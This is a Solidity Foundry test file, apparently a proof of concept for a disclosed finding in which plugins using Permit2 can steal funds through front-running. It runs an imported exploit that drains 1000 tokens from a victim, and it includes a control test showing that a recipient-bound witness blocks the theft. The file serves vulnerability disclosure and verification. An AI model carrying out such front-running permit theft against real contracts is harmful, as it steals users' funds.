// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    Permit2
} from "./54669-any-plugins-using-permit2-can-steal-funds-with-frontrunning.sol";

contract Finding54669Test is Test {
    function setUp() public {
        vm.etch(
            0x4e59b44847b379578588920cA78FbF26c0B4956C,
            hex"7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe03601600081602082378035828234f58015156039578182fd5b8082525050506014600cf3"
        );
    }

    function test_exploit_frontrun_permit_pulls_1000() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.attackerGot(), 1000 ether, "attacker pulled 1000");
        assertEq(e.victimAfter(), 0, "victim lost 1000");
        assertEq(e.token().balanceOf(address(this)), 1000 ether, "1000 landed on the caller");
    }

    function test_control_witness_binds_the_recipient() public {
        Exploit e = new Exploit();
        e.mintVictim();
        assertEq(e.token().balanceOf(e.VICTIM()), 1000 ether, "victim funded");
        vm.expectRevert(Permit2.WitnessMismatch.selector);
        e.pullBound(address(this));
        assertEq(e.token().balanceOf(e.VICTIM()), 1000 ether, "bound permit did not pay the attacker");
        assertEq(e.token().balanceOf(address(this)), 0, "attacker received nothing");
    }
}
